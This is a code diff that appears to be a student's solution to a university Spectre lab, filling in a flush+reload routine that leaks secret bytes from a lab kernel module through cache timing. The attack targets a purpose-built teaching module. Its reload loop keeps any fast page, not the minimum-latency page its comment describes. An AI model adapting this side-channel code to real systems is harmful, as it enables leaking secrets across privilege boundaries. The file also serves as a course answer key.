@@ -11,6 +11,8 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define DRAM_THRESHOLD 200
+
 /*
  * call_kernel_part1
  * Performs the COMMAND_PART1 call in the kernel
@@ -51,7 +53,25 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
 
+        // 1. Flush: Flush all probe pages from the cache.
+        for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
+            clflush(shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE)); // Flush the start of each page
+        }
+
+        // 2. Victim execution: Call the victim method to leak a given secret byte by properly configuring offset.
+        call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+        // 3. Reload: Probe every page and take the minimum-latency page as the leaked value.
+        for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
+            size_t idx = i * SHD_SPECTRE_LAB_PAGE_SIZE; // 4096 * i to get the start of each page
+            uint64_t time = time_access(shared_memory + idx);
+            if (time < DRAM_THRESHOLD) {
+                leaked_byte = (char)i;
+            }
+        }
+
         leaked_str[current_offset] = leaked_byte;
+        // printf("Leaked byte %zu: 0x%02x\n", current_offset, leaked_byte);
         if (leaked_byte == '\x00') {
             break;
         }
